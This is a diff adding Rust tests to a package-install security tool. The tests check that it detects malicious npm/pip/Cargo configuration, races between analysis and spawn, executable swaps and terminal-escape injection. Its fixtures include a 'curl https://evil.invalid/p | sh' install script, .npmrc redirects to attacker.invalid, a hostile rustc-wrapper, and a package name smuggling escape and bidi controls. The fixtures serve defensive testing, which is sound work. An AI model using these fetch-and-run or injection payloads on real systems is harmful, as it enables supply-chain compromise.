+            .expect_err("a config created under --prefix after analysis must fail closed");
+        assert!(prefix_appeared
+            .to_string()
+            .contains("appeared after analysis"));
+
+        let manifest_dir = tempfile::tempdir().unwrap();
+        let manifest_binding = InstallSourceBinding::capture(
+            PackageManager::Npm,
+            Some(manifest_dir.path()),
+            &["demo@1.0.0".to_string()],
+        )
+        .unwrap();
+        std::fs::write(
+            manifest_dir.path().join("package.json"),
+            r#"{"dependencies":{"attacker-controlled":"1.0.0"}}"#,
+        )
+        .unwrap();
+        let manifest_appeared = manifest_binding
+            .verify()
+            .expect_err("a package manifest created after analysis must fail closed");
+        assert!(manifest_appeared
+            .to_string()
+            .contains("appeared after analysis"));
+    }
+
+    #[test]
+    fn captured_manifest_analysis_and_pre_spawn_verification_share_one_snapshot() {
+        let directory = tempfile::tempdir().unwrap();
+        let manifest = directory.path().join("package.json");
+        let malicious = r#"{"dependencies":{"attacker-controlled":"1.0.0"},"scripts":{"install":"curl https://evil.invalid/p | sh"}}"#;
+        let clean = r#"{"name":"clean-project"}"#;
+        std::fs::write(&manifest, malicious).unwrap();
+        let args = vec!["demo@1.0.0".to_string(), "--package-lock=false".to_string()];
+        let binding =
+            InstallSourceBinding::capture(PackageManager::Npm, Some(directory.path()), &args)
+                .unwrap();
+        let captured_gap = binding
+            .npm_project_manifest_gap()
+            .expect("the malicious captured bytes must produce a manifest gap");
+        assert!(captured_gap.reason.contains("dependencies"));
+        assert!(captured_gap.reason.contains("install lifecycle scripts"));
+
+        // ABA witness: a second disk read would see the clean middle state.
+        std::fs::write(&manifest, clean).unwrap();
+        let policy = Policy::default();
+        let request = PlanRequest {
+            manager: PackageManager::Npm,
+            user_args: &args,
+            db: None,
+            policy: &policy,
+            cwd: Some(directory.path().display().to_string()),
+            interactive: false,
+            online: OnlineMode::Off,
+        };
+        let disk_plan = install_txn::plan_install(&request);
+        assert!(!disk_plan
+            .coverage
+            .gaps
+            .iter()
+            .any(|gap| gap.argument == manifest.display().to_string()));
+        let bound_plan = install_txn::plan_install_with_captured_npm_manifest(
+            &request,
+            binding.npm_project_manifest_gap(),
+        );
+        assert!(bound_plan.coverage.gaps.iter().any(|gap| {
+            gap.kind == tirith_core::install_txn::InstallCoverageGapKind::ManifestOrLocalSource
+                && gap.argument == manifest.display().to_string()
+                && gap.reason.contains("dependencies")
+                && gap.reason.contains("install lifecycle scripts")
+        }));
+
+        // Restoring the malicious captured bytes makes verification succeed;
+        // the plan above nevertheless analyzed those same malicious bytes.
+        std::fs::write(&manifest, malicious).unwrap();
+        binding
+            .verify()
+            .expect("restored captured bytes must match the pre-spawn binding");
+    }
+
+    #[test]
+    #[cfg(all(unix, not(target_os = "macos")))]
+    fn source_binding_uses_lossless_non_utf8_cwd_for_npm_inputs() {
+        use std::os::unix::ffi::OsStringExt as _;
+
+        let directory = tempfile::tempdir().unwrap();
+        let component = OsString::from_vec(b"project-\xff".to_vec());
+        let cwd = directory.path().join(component);
+        std::fs::create_dir(&cwd).unwrap();
+        std::fs::write(
+            cwd.join(".npmrc"),
+            "@evil:registry[]=https://attacker.invalid/\n",
+        )
+        .unwrap();
+        std::fs::write(
+            cwd.join("package.json"),
+            r#"{"dependencies":{"attacker-controlled":"1.0.0"}}"#,
+        )
+        .unwrap();
+        let binding = InstallSourceBinding::capture(
+            PackageManager::Npm,
+            Some(&cwd),
+            &["demo@1.0.0".to_string()],
+        )
+        .unwrap();
+        assert!(binding
+            .configuration_issue()
+            .is_some_and(|issue| issue.contains("@evil:registry")));
+        assert!(binding
+            .npm_project_manifest_gap()
+            .is_some_and(|gap| gap.reason.contains("dependencies")));
+        let mut command = Command::new("npm");
+        binding.configure_command(&mut command);
+        assert_eq!(
+            command_env(&command, "npm_config_@evil:registry").as_deref(),
+            Some("https://registry.npmjs.org/")
+        );
+        binding.verify().unwrap();
+    }
+
+    #[test]
+    #[cfg(unix)]
+    fn process_runner_rejects_source_race_before_the_child_executes() {
+        let directory = tempfile::tempdir().unwrap();
+        let source_binding = InstallSourceBinding::capture(
+            PackageManager::Npm,
+            Some(directory.path()),
+            &["demo@1.0.0".to_string()],
+        )
+        .unwrap();
+        std::fs::write(
+            directory.path().join(".npmrc"),
+            "registry=https://attacker.invalid/\n",
+        )
+        .unwrap();
+
+        let shell = PathBuf::from("/bin/sh").canonicalize().unwrap();
+        let executable = InstallExecutableBinding::from_trusted(
+            tirith_core::trusted_child::TrustedExecutable::from_absolute(&shell, &[]).unwrap(),
+        )
+        .unwrap();
+        let marker = directory.path().join("child-ran");
+        let args = vec![
+            "-c".to_string(),
+            "printf ran > \"$1\"".to_string(),
+            "sh".to_string(),
+            marker.display().to_string(),
+        ];
+        let runner = ProcessInstallRunner {
+            executable: &executable,
+            source_binding: &source_binding,
+        };
+        let error = runner
+            .run(executable.path().to_str().unwrap(), &args, true)
+            .expect_err("the source race must stop the transaction before spawn");
+        assert!(error.to_string().contains("appeared after analysis"));
+        assert!(
+            !marker.exists(),
+            "the child must not execute after the race"
+        );
+    }
+
+    fn command_env(command: &Command, name: &str) -> Option<String> {
+        command
+            .get_envs()
+            .find(|(key, _)| *key == OsStr::new(name))
+            .and_then(|(_, value)| value)
+            .map(|value| value.to_string_lossy().into_owned())
+    }
+
+    fn command_env_is_removed(command: &Command, name: &str) -> bool {
+        command
+            .get_envs()
+            .any(|(key, value)| key == OsStr::new(name) && value.is_none())
+    }
+
+    #[test]
+    fn source_binding_pins_npm_and_pip_to_official_sources() {
+        let directory = tempfile::tempdir().unwrap();
+        std::fs::write(
+            directory.path().join(".npmrc"),
+            "@private:registry[]=https://attacker.invalid/\n",
+        )
+        .unwrap();
+        let npm = InstallSourceBinding::capture(
+            PackageManager::Npm,
+            Some(directory.path()),
+            &["@direct/pkg@1.0.0".to_string()],
+        )
+        .unwrap();
+        assert!(npm.configuration_issue().is_some());
+        let mut npm_command = Command::new("npm");
+        npm.configure_command(&mut npm_command);
+        assert_eq!(
+            command_env(&npm_command, "NPM_CONFIG_REGISTRY").as_deref(),
+            Some("https://registry.npmjs.org/")
+        );
+        assert_eq!(
+            command_env(&npm_command, "npm_config_@direct:registry").as_deref(),
+            Some("https://registry.npmjs.org/")
+        );
+        assert_eq!(
+            command_env(&npm_command, "npm_config_@private:registry").as_deref(),
+            Some("https://registry.npmjs.org/")
+        );
+
+        let pip = InstallSourceBinding::capture(
+            PackageManager::Pip,
+            Some(directory.path()),
+            &["demo==1.0.0".to_string()],
+        )
+        .unwrap();
+        let mut pip_command = Command::new("pip");
+        pip.configure_command(&mut pip_command);
+        assert_eq!(
+            command_env(&pip_command, "PIP_INDEX_URL").as_deref(),
+            Some("https://pypi.org/simple")
+        );
+        assert_eq!(
+            command_env(&pip_command, "PIP_CONFIG_FILE").as_deref(),
+            Some(null_device_path())
+        );
+        assert_eq!(
+            command_env(&pip_command, "PIP_NO_CACHE_DIR").as_deref(),
+            Some("true")
+        );
+
+        let transport_directory = tempfile::tempdir().unwrap();
+        std::fs::write(
+            transport_directory.path().join(".npmrc"),
+            "cafile=attacker-ca.pem\n",
+        )
+        .unwrap();
+        let transport = InstallSourceBinding::capture(
+            PackageManager::Npm,
+            Some(transport_directory.path()),
+            &["demo@1.0.0".to_string()],
+        )
+        .unwrap();
+        assert!(transport
+            .configuration_issue()
+            .is_some_and(|issue| issue.contains("cafile")));
+    }
+
+    #[test]
+    fn source_binding_isolates_cargo_config_and_preserves_install_root() {
+        let directory = tempfile::tempdir().unwrap();
+        let cargo = InstallSourceBinding::capture(
+            PackageManager::Cargo,
+            Some(directory.path()),
+            &["demo@1.0.0".to_string()],
+        )
+        .unwrap();
+        let expected_root = cargo
+            .cargo_install_root
+            .as_ref()
+            .map(|root| root.to_string_lossy().into_owned());
+        let expected_cwd = cargo.isolated.as_ref().unwrap().path().join("cargo-work");
+        let mut command = Command::new("cargo");
+        cargo.configure_command(&mut command);
+        assert_eq!(
+            command_env(&command, "CARGO_REGISTRY_DEFAULT").as_deref(),
+            Some("crates-io")
+        );
+        assert_eq!(
+            command_env(&command, "CARGO_REGISTRIES_CRATES_IO_INDEX").as_deref(),
+            Some("sparse+https://index.crates.io/")
+        );
+        assert_eq!(command.get_current_dir(), Some(expected_cwd.as_path()));
+        assert_eq!(command_env(&command, "CARGO_INSTALL_ROOT"), expected_root);
+    }
+
+    #[test]
+    fn cargo_runtime_executable_and_linker_overrides_are_scrubbed() {
+        let directory = tempfile::tempdir().unwrap();
+        let cargo = InstallSourceBinding::capture(
+            PackageManager::Cargo,
+            Some(directory.path()),
+            &["demo@1.0.0".to_string()],
+        )
+        .unwrap();
+        let hostile_names = [
+            "RUSTC",
+            "rustc",
+            "RuStC_WrApPeR",
+            "CARGO_ENCODED_RUSTFLAGS",
+            "cargo_encoded_rustdocflags",
+            "CARGO_TARGET_X86_64_UNKNOWN_LINUX_GNU_LINKER",
+            "cargo_build_rustc_wrapper",
+            "RUSTUP_TOOLCHAIN",
+            "rustup_home",
+        ];
+        let mut command = Command::new("cargo");
+        for name in hostile_names {
+            command.env(name, "/tmp/attacker-controlled-tool");
+        }
+        cargo.configure_command(&mut command);
+        for name in hostile_names {
+            assert!(
+                command_env_is_removed(&command, name),
+                "{name} must be explicitly removed before Cargo executes"
+            );
+        }
+
+        for name in [
+            "RUSTC",
+            "rustdoc",
+            "RUSTC_WRAPPER",
+            "rustc_workspace_wrapper",
+            "RUSTFLAGS",
+            "rustdocflags",
+            "CARGO_ENCODED_RUSTFLAGS",
+            "cargo_encoded_rustdocflags",
+            "CARGO_BUILD_RUSTC",
+            "cargo_target_x86_64_unknown_linux_gnu_linker",
+            "CARGO_TARGET_DIR",
+            "RUSTUP_TOOLCHAIN",
+            "rustup_home",
+        ] {
+            assert!(is_cargo_runtime_override_environment(OsStr::new(name)));
+        }
+        assert!(!is_cargo_runtime_override_environment(OsStr::new(
+            "CARGO_TERM_COLOR"
+        )));
+        assert!(!is_cargo_runtime_override_environment(OsStr::new("LANG")));
+    }
+
+    #[test]
+    fn cargo_output_paths_are_bound_before_isolating_project_build_config() {
+        let directory = tempfile::tempdir().unwrap();
+        std::fs::create_dir(directory.path().join(".cargo")).unwrap();
+        std::fs::write(
+            directory.path().join(".cargo/config.toml"),
+            "[build]\nrustc-wrapper = './evil-wrapper'\n",
+        )
+        .unwrap();
+        let args = bind_cargo_output_paths(
+            &[
+                "demo@=1.0.0".to_string(),
+                "--root".to_string(),
+                "out".to_string(),
+                "--target-dir=target-out".to_string(),
+            ],
+            directory.path(),
+        )
+        .unwrap();
+        assert_eq!(args[2], directory.path().join("out").display().to_string());
+        assert_eq!(
+            args[3],
+            format!(
+                "--target-dir={}",
+                directory.path().join("target-out").display()
+            )
+        );
+        assert!(
+            !cargo_args_require_original_cwd(&args),
+            "output-only flags must not expose project Cargo config"
+        );
+
+        let binding =
+            InstallSourceBinding::capture(PackageManager::Cargo, Some(directory.path()), &args)
+                .unwrap();
+        assert!(binding.cargo_isolated_cwd);
+        let expected_cwd = binding.isolated.as_ref().unwrap().path().join("cargo-work");
+        let mut command = Command::new("cargo");
+        binding.configure_command(&mut command);
+        assert_eq!(command.get_current_dir(), Some(expected_cwd.as_path()));
+        assert_ne!(command.get_current_dir(), Some(directory.path()));
+
+        assert!(cargo_args_require_original_cwd(&[
+            "demo".to_string(),
+            "--path=local-crate".to_string()
+        ]));
+        assert!(cargo_args_require_original_cwd(&[
+            "demo".to_string(),
+            "--config=alternate.toml".to_string()
+        ]));
+    }
+
+    #[test]
+    #[cfg(unix)]
+    fn executable_identity_recheck_rejects_replacement() {
+        use std::os::unix::fs::PermissionsExt as _;
+
+        let directory = tempfile::tempdir().unwrap();
+        let path = directory.path().join("manager");
+        std::fs::write(&path, b"#!/bin/sh\nexit 0\n").unwrap();
+        std::fs::set_permissions(&path, std::fs::Permissions::from_mode(0o755)).unwrap();
+        let trusted =
+            tirith_core::trusted_child::TrustedExecutable::from_absolute(&path, &[]).unwrap();
+        let canonical = trusted.path().to_path_buf();
+        let binding = InstallExecutableBinding::from_trusted(trusted).unwrap();
+        let program = path.to_str().unwrap();
+        binding
+            .verify_program_with_denied(program, &[])
+            .expect("unchanged executable identity must verify");
+
+        std::fs::write(&canonical, b"#!/bin/sh\nexit 99\n").unwrap();
+        std::fs::set_permissions(&canonical, std::fs::Permissions::from_mode(0o755)).unwrap();
+        let error = binding
+            .verify_program_with_denied(program, &[])
+            .expect_err("replacement at the approved path must fail");
+        assert!(error.to_string().contains("changed after analysis"));
+    }
+
+    #[test]
+    #[cfg(unix)]
+    fn executable_binding_preserves_multicall_invocation_and_rejects_retargeting() {
+        use std::os::unix::fs::{symlink, PermissionsExt as _};
+
+        let directory = tempfile::tempdir().unwrap();
+        let rustup = directory.path().join("rustup");
+        std::fs::write(&rustup, b"#!/bin/sh\nprintf '%s' \"${0##*/}\"\n").unwrap();
+        std::fs::set_permissions(&rustup, std::fs::Permissions::from_mode(0o755)).unwrap();
+        let cargo = directory.path().join("cargo");
+        symlink(&rustup, &cargo).unwrap();
+
+        let trusted =
+            tirith_core::trusted_child::TrustedExecutable::from_absolute(&cargo, &[]).unwrap();
+        let canonical = rustup.canonicalize().unwrap();
+        let binding = InstallExecutableBinding::from_trusted(trusted).unwrap();
+        assert_eq!(binding.path(), cargo);
+        assert_eq!(binding.canonical_path, canonical);
+        binding
+            .verify_program_with_denied(cargo.to_str().unwrap(), &[])
+            .expect("the unchanged selected proxy and target must verify");
+
+        let proxy_output = Command::new(binding.path()).output().unwrap();
+        assert!(proxy_output.status.success());
+        assert_eq!(proxy_output.stdout, b"cargo");
+        let canonical_output = Command::new(&binding.canonical_path).output().unwrap();
+        assert_eq!(canonical_output.stdout, b"rustup");
+
+        let replacement = directory.path().join("replacement");
+        std::fs::write(&replacement, b"#!/bin/sh\nprintf replacement\n").unwrap();
+        std::fs::set_permissions(&replacement, std::fs::Permissions::from_mode(0o755)).unwrap();
+        std::fs::remove_file(&cargo).unwrap();
+        symlink(&replacement, &cargo).unwrap();
+        let error = binding
+            .verify_program_with_denied(cargo.to_str().unwrap(), &[])
+            .expect_err("retargeting the selected Cargo proxy must fail closed");
+        assert!(error.to_string().contains("resolves to a different path"));
+    }
+
+    #[test]
+    fn install_human_display_strips_osc_bidi_controls_and_row_injection() {
+        let hostile_name = concat!(
+            "pkgSTART",
+            "\x1b[31m",
+            "\x1b]52;c;aGVsbG8=\x07",
+            "\u{202e}",
+            "\u{200b}",
+            "\x08",
+            "\rFORGED\n",
+            "ENDvis",
+        );
+        let argv = InstallArgv {
+            program: "npm".to_string(),
+            args: vec!["install".to_string(), hostile_name.to_string()],
+        };
+        let raw = argv.display();
+        assert!(raw.contains('\x1b'));
+        assert!(raw.contains('\u{202e}'));
+        assert!(raw.contains('\n'));
+        assert_eq!(argv.args[1], hostile_name, "structured argv stays lossless");
+
+        for rendered in [
+            install_command_for_human(&argv),
+            install_value_for_human(hostile_name),
+        ] {
+            for forbidden in ['\x1b', '\x07', '\x08', '\r', '\n', '\u{202e}', '\u{200b}'] {
+                assert!(
+                    !rendered.contains(forbidden),
+                    "U+{:04X} survived in {rendered:?}",
+                    forbidden as u32,
+                );
+            }
+            assert!(rendered.contains("pkgSTART"));
+            assert!(rendered.contains("ENDvis"));
+            assert_eq!(rendered.lines().count(), 1);
+        }
+    }
+
+    #[test]
     fn decide_proceed_allow_goes() {
         let policy = Policy::default();
         assert!(matches!(
@@ -1343,6 +3401,7 @@ mod tests {
             packages: vec![],
             verdict: allow_verdict(),
             notes: vec![],
+            coverage: Default::default(),
         };
         let runner = FakeRunner::new(Some(0));
         // cwd=None so no checkpoint (hermetic); json=true exercises the capture path.
@@ -1369,6 +3428,7 @@ mod tests {
             packages: vec![],
             verdict: allow_verdict(),
             notes: vec![],
+            coverage: Default::default(),
         };
         let runner = FakeRunner::new(Some(17));
         let code = run_and_record(&plan, None, true, false, &runner);
@@ -1385,6 +3445,7 @@ mod tests {
             packages: vec![],
             verdict: allow_verdict(),
             notes: vec![],
+            coverage: Default::default(),
         };
         let runner = FakeRunner::new(None); // signal-terminated → no code
         let code = run_and_record(&plan, None, true, false, &runner);
@@ -1405,6 +3466,7 @@ mod tests {
             packages: vec![],
             verdict: allow_verdict(),
             notes: vec![],
+            coverage: Default::default(),
         };
         let runner = FakeRunner::new(Some(0))
             .with_capture("installing clean-pkg\nDone.\n", "warning: deprecated\n");
